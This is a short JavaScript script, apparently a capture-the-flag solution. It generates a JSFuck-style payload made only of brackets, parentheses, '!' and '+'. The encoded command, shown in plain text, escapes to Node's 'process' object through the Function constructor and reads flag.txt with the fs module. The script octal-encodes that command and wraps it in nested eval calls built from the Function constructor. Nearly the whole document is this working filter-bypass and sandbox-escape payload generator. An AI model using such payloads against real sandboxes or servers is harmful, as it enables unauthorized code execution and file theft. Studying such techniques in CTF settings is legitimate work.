[].__proto__.toString=()=>'^w^'
backslash = `([]
    [(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]
    [([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]
    ((!![]+[])[+!+[]] + (!![]+[])[!+[]+!+[]+!+[]] + (!![]+[])[+!!+[]]+([][[]]+[])[+!!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+!!+[]])[([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+![]+
      (![]+[+!!+[]])[([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]
    )
    ()[([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]((![]+[+!!+[]])[([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])[+!+[]]`
// create octal codes
w=(Array.from(`console.log(import('fs').constructor.constructor('return process')().mainModule.require('fs').readFileSync('flag.txt').toString())`, c => `${backslash}+(${'!+[]+'.repeat(+c.codePointAt().toString(8)).slice(0, -1)})`).join('+'))
// return string of octal codes
w=`(!![]+[])[+!+[]] +
  (!![]+[])[!+[]+!+[]+!+[]] +
  (!![]+[])[+!!+[]] +
  ([][[]]+[])[+!!+[]] +
  (!![]+[])[+!+[]] +
  ([][[]]+[])[+!+[]] +
  ([]+[])[(![]+[])[+!!+[]] +
  (!![]+[][(![]+[])[+!!+[]] +
    (![]+[])[!+[]+!+[]] +
    (![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]] +
    ([][[]]+[])[+!+[]]+(!![]+[])[+!!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]
    ()[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]
  +
  ${w}
  +
  ([]+[])[(![]+[])[+!!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+!!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]()[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]`
// eval string expression
w=`[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]
[([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]
(${w})
()`
// eval it
w=`[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]
[([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(!![]+[][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]
(${w})
()`
w = w.replace(/\s/g, '')
console.log(w)